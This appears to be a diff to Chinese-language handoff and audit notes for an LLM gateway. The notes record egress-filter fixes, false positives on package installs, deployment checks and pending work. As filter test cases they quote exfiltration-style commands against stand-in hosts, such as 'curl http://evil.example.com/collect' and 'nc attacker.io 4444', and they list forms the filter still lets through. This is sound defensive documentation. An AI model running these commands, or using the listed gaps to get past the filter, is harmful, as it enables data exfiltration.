@@ -135,11 +135,24 @@
 - ~~**域名形式的外传目标从不被拦**~~（`curl http://evil.example.com/collect`
   不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**r1016 已修**（域名只在 URL 主机位
   识别，不做裸点分词，否则 `cat README.md`、`v1.2.3` 全会被误判），**r1017 补齐
-  残留的裸主机+端口形态**。**两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
+  残留的裸主机+端口形态**（**该形态已于 r1018 撤除**，见下）。
+  **两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
   上线**——那两轮部署由并行会话执行，`37099db2` 是本仓提交，含 r1016/r1017。
   线上复验：`/v1/models` 对伪造 `sk-` token 已返回 401（修复前 200 + 615 个模型）。
   **关键设计**：默认公网可达即阻断，只豁免明确不可路由的主机
   （`.local/.internal/.cluster.local/.lan/.home.arpa` 等 + 单标签名）。
+- ★ **r1016/r1017 自身引入过两类大面积误伤（r1018 已修正，教训值得单独记）**：
+  r1016 的 `user@host` 正则把 `npm install lodash@4.17.21`、`go get x@v1.2.3`、
+  `cargo add serde@1.0.197` 等**装包命令整类阻断**（pkg@1.2.3 被当成 user@host，
+  且 `4.17.21` 走默认公网判定）；r1017 的「裸主机+空格+端口」正则把
+  `node server.js 8080`、`python3 main.py 100` **打死**。两条规则已撤除——
+  前者冗余（email 规则 + isNonExfiltrationEmailFragment 已覆盖），
+  后者与脚本调用**结构上不可区分**，默认阻断方向就是错的。
+  **教训**：把「锚定上下文」当成充分条件是错的——锚定之后那段文本**仍然未必是
+  主机**（`pkg@1.2.3` 的 `4.17.21`、`main.py` 都不是）。判据见
+  `TestR1017VersionSpecsAndScriptArgsAreNotDestinations`，谁再往提取器里加
+  「长得像主机」的形态会先撞上它。
+  **残留缺口**：`nc attacker.io 4444`、`curl evil.io/path`（无 scheme）仍放行。
 - ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
   整条 `output_policy_blocked`，而 `ssh ops@10.24.7.91` 放行——**同一操作，写 IP
   放行、写内网域名阻断**，与 dc63f19ff 同构。**r1017 已修**：豁免按**类型**分派，
@@ -193,26 +206,34 @@
 在本地任务注册表中已不存在（not found），无法回读其输出——按批判原则，
 它们的「succeeded」状态**不得**被转述为「已读取并确认」。
 
-### 下一轮提示词（收尾核验轮产出）
+### 下一轮提示词（2026-10-11 晚间审计轮更新）
 
-1. **部署 r1016+r1017**（需用户显式授权）：`a3b65ba68` 已在 origin/main。部署后
-   复验三件事：`/v1/models` 带伪造 token 必须 401；`ssh ops@10.24.7.91 uptime` 与
-   `ssh ops@内网域名 uptime` 同放行；公网域名外传（`curl http://evil.example.com`）
-   仍阻断。生产当前 2533（他人部署），蓝绿端口看
-   `/opt/llm-gateway-go/run/active-upstream.conf`。
+1. **r1016/r1017 已随 2537/2539 上线（16:34，并行会话部署）——下轮对生产复验**：
+   `/v1/models` 带伪造 token 必须 401；`ssh ops@10.24.7.91 uptime` 与
+   `ssh ops@内网域名 uptime` 同放行；公网域名外传仍阻断。另验
+   12272e57c 的效果：probe 风暴应消失（此前 credential 19 连续失败 1058 次
+   仍被周期重探），`node_probe_state` 里 EOL 凭据应保持 ready、仅 binding 摘除。
+   蓝绿端口看 `/opt/llm-gateway-go/run/active-upstream.conf`。
 2. **上游可路由性（口径已修正）**：旧口径「成功率 ~50%」系统计噪音（探针失败 +
    401 风暴混入），午间复测实况 503≈2.5%、11 时真实成功率约 75%（详见
    `docs/audit/2026-10-11-154-503-口径修正与漂移清单.md`）。**模型目录漂移仍是
    实体问题**：12 凭据、96 模型名 404/410。属数据/配置层决策（清退失效绑定 /
    修模型目录 / 降权重），代码不可解，等用户拍板。**另注意生产
    `archive_request_logs_default`（42703）是 754 修复前的坏版本，TTL 归档从未
-   工作，重放 754 即修**。审计统计一律用热表，别拿父表 `success` 列算比率
-   （8h 滞后）。
+   工作，重放 754 即修（幂等，步骤在审计文档 §五）**。审计统计一律用热表，
+   别拿父表 `success` 列算比率（8h 滞后）。
 3. **fail-open 占位符透传遗留缺陷**：96 行样本、真值零泄漏、中低危，根因未定位；
    推进需在 fail-open 分支加结构化日志 + 收集真实流量 + 另行发布授权。
 4. **还原半程**：601,914 行 `original_encrypted` 全 NULL。若用户要还原功能，
    决策点是把 `db_sink.go` 加解密读取方（新代码）而不是配密钥（无读取方，
    配了也白配）。
+5. **晚间审计轮新增遗留**：(a) A2 的 `PermanentlyDisabled`/`PermanentRejections`
+   量具字段无生产消费方，接线到 /metrics 或 admin 端点；(b) deploy-local 对空
+   `web/` 补 refuse 门（52 行坑的代码侧收口）；(c) 12272e57c 的 EOL 措辞
+   contains 匹配脆弱（上游换文案即漏判回凭据级）；(d) 窗口外 8 条 UNMERGED
+   远端分支待维护者裁决（`2026-07-25-realtime-routing-self-heal`、
+   `fix/context-limit-p2-audit`、`fix/hotzone-plan-critical-audit` 等，最后
+   提交均 ≤09-28）。
 
 ## 已完成（已推送）
 
@@ -453,10 +474,15 @@ bash scripts/deploy-245.sh --seq <seq>          # seq 必须自增且不与他�
 
 ### SSOT 软链的真实情况
 
-**2026-10-11 下午更新：`~/workspace/ai-native-tools/` 目录已从本机消失**，
-`~/workspace/ai-native-workspace/deploy-lib`（软链目标，`lock.sh` 在场）成为唯一
-SSOT——**软链现在解析有效**，`AIAN_DEPLOY_LIB` 可不设或指 ai-native-workspace。
-本机各目录朝不保夕（同日 `~/sdk/bash5` 也被清过），用前先 `ls` 确认。
+**2026-10-11 晚间复测更正（多 checkout/多机事实不同，用前必须实测）**：
+下午那轮「ai-native-tools 已从本机消失、软链解析有效」的记录**对本
+checkout（llm-gateway-go）不成立**——22:xx 实测：`ai-native-tools/deploy-lib`
+**在场**、`ai-native-workspace/deploy-lib` **不在**，本 checkout 的
+`scripts/deploy-lib` 软链（目标 `../../ai-native-workspace/deploy-lib`）**断链**
+（deploy_local_contract_test 在 cd 软链处挂）。下午的记录可能出自另一份
+checkout 或当时目录状态确有变化（同日 `~/sdk/bash5` 确被清过一次）。
+**结论不变的部分**：任何会话跑 deploy 相关脚本前先 `ls` 确认两处 SSOT
+哪个在场，用 `AIAN_DEPLOY_LIB` 指向在场的那个；软链 rebind 仍留维护者裁决。
 
 ### host-first 本地部署的 2538 轮新坑（2026-10-11 下午实测）
 
@@ -560,3 +586,50 @@ glm-5.2 系 10×410）。**待 owner 拍板：清退 / 修目录 / 降权**—�
    `npm install --package-lock-only` 重生成修过一次；**改依赖后记得同步**。
 4. 部署全程需要：`PATH` 含 `~/sdk/go/bin`（go1.27.1）与
    `~/sdk/bash5/bin`（deploy-lib bash 4+ 语法），否则分别在后端构建与 lib 加载处失败。
+
+## 2026-10-11 晚间 24h 审计轮（窗口 10-10 22:16 → 10-11 21:16，46 提交逐条批审）
+
+**拉取**：快进合并 `9fe5320b6..b98678fc5`（6 提交：SPA 深链 401 放行 r2540、
+host-first 孤儿网关回收 + 517 形态探测 r2538、mobile UX 第二轮、252 netbird 文档、
+12h 审计 A1/A2、r1016/r1017 生产复验文档）。
+
+**全门状态（本轮实测）**：`go build ./...`、`go vet ./...` rc=0；
+`apply-db-revision-sequence_test` rc=0；installer 13 包全绿；
+`CGO_ENABLED=0 go test ./admin/... ./bg/... ./settings/... ./domains/stats/...`
+仅负向闸门 `TestV1BodiesReadersAreAssessed` 一红（维护者策略）；新增测件
+`middleware`（含 auth_mw 三件套）ok、`tests/deploy_local_reap_test.sh` rc=0；
+`security/...` 全绿、`domains/streaming` ok（168s）；web-mobile 193 文件
+7177 测试全绿。
+
+**三族实质发现（已修/已登记）**：
+
+1. **a60391fb0（SPA 深链 text/html 放行）放行面核验通过，但安全性是隐式的**——
+   逐条核验了 AuthMiddleware 守卫范围内全部 mux 路径：`/internal/*`、
+   `/api/v1/plugins/*` 自带 AdminToken/AdminMiddleware 守卫；
+   `/v1beta/models/`（**不匹配** `/v1` 前缀判断）与 `/v1/models/` 挂的
+   GeminiHandler 对列表形状 404、对 `:generateContent` 交给 ChatHandler
+   内嵌 keyVerifier 段二次鉴权（handler.go:2315，fail-closed）——无匿名暴露面。
+   已在 `middleware/auth_mw.go` 的 `spaProtectedPrefixes` 上补维护契约注释：
+   未来把无自守卫的新 handler 挂顶层路径必须同步加清单，否则 text/html 匿名直达。
+2. **9fe5320b6 A2 的 `PermanentlyDisabled`/`PermanentRejections` 无生产消费方**
+   （Stats() 只被测试调用）——自禁用事件有 slog.Error 兜底（日志可见），
+   缺聚合视图，P3 遗留：接线到 /metrics 或 admin 端点留给下轮。
+3. **AGENTS SSOT 段文档失真已更正**（上方「SSOT 软链的真实情况」节）：
+   下午「ai-native-tools 已消失、软链有效」对本 checkout 不成立，实测
+   ai-native-tools 在场、ai-native-workspace 不在、软链断——多 checkout/
+   多机事实不同，用前先 ls。
+
+**遗留（登记不修）**：12272e57c 的 EOL 识别靠措辞 contains（"end of life"/
+"no longer available"），上游换文案会漏判回凭据级（probe 风暴复发点）；
+窗口外 8 条 UNMERGED 远端分支（最后提交 ≤09-28，清单见审计输出）按保守口径
+只登记不删；本地 2 条已合并 sanitize 分支同口径。
+
+**分支窗口结论**：24h~1h 窗口内零未合并分支，无需删/合并动作。
+
+**补充（推送时合并进来的 r1018，a39bb6769）**：并行会话对 r1016/r1017 做批判审计，
+发现两条自引入的大面积误伤——`pkg@1.2.3` 被 egressHostFromUserInfo 当成
+`user@host` 整类阻断装包命令；`nc attacker.io 4444` 收口正则误伤
+`node server.js 8080` 形态的脚本调用。r1018 撤掉这两条有害提取规则（其原覆盖面
+本就由 email/IP 规则 + r1017 的 isNonExfiltrationEmailFragment 兜住）。
+**本晚间审计轮批读 a3b65ba68 时未深审到这两个误伤面，属审计盲区，如实记录**。
+下一轮生产复验若见「装包/脚本调用不再被阻断」即 r1018 效果，非回归。
